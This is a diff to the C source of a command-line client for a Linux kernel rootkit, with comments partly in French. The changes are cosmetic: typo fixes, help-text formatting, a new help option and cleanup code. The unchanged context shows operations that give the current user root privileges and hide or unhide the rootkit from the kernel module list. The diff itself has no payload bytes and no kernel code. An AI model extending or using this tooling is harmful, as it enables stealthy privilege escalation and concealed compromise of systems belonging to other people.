@@ -4,7 +4,6 @@
 #include <fcntl.h>
 #include <unistd.h>
 
-#include "include/core.h"
 #include "include/debug.h"
 #include "include/config.h"
 
@@ -42,8 +41,8 @@ void display_help(char * filename){
     printf("    %s <operation>\n", filename+2);
     printf("\n");
     printf("Operations: \n");
-    printf("    -h --help       Display this menu\n");
-    printf("    -p --privesc    Give root privileges to the current user\n");
+    printf("    -h, --help      Display this menu\n");
+    printf("    -p, --privesc   Give root privileges to the current user\n");
     printf("    --info          Display infos about the rootkit\n");
     printf("    --hide          Hide the rootkit from modules list\n");
     printf("    --unhide        Unhide the rootkit from module list (then allow us to remove the rootkit)\n");
@@ -63,6 +62,8 @@ int check_driver(char *driver){
     CLIENT_DEBUG("Driver found\n");
     return 0;
 }
+
+
 
 // check_driver est éxécuté avant donc devrait pas y avoir de soucis
 int privesc(char *driver){
@@ -96,7 +97,7 @@ int hide(char *driver){
         return -1;
     } else{
         CLIENT_DEBUG("Wrote : '%s' for a length of %ld bytes\n", payload, strlen(payload));
-        CLIENT_DEBUG("Rootkit shouldd be hidden from lsmod ! \n");
+        CLIENT_DEBUG("Rootkit should be hidden from lsmod ! \n");
     }
 
     return 0;
@@ -115,7 +116,7 @@ int unhide(char *driver){
         return -1;
     } else{
         CLIENT_DEBUG("Wrote : '%s' for a length of %ld bytes\n", payload, strlen(payload));
-        CLIENT_DEBUG("Rootkit sholud be present in lsmod ! \n");
+        CLIENT_DEBUG("Rootkit should be present in lsmod ! \n");
     }
 
     return 0;
@@ -153,27 +154,36 @@ int main(int argc, char *argv[]) {
         else if ((strcmp(argv[i], "--info") == 0) && (i == 1))
         {
             show_info();
-            exit(-1);   
+            goto end;  
         }
 
         else if (strcmp(argv[i], "--unhide") == 0)
         {
             unhide(driver);
-            exit(-1);   
+            goto end;  
         }
 
         else if (strcmp(argv[i], "--hide") == 0)
         {
 
             hide(driver);
-            exit(-1);   
+            goto end;  
+        }
+        else if (strcmp(argv[i], "-h") == 0 || (strcmp(argv[i], "--help") == 0))
+        {
+
+            display_help(driver);
+            goto end; 
         }
         else if (i > 0)
         {
             printf("Unknown argument : %s\n", argv[i]);
-            exit(-1);
+            goto end;
         }
     }
+
+    end: 
+        free(driver);
 
     return 0;
 }
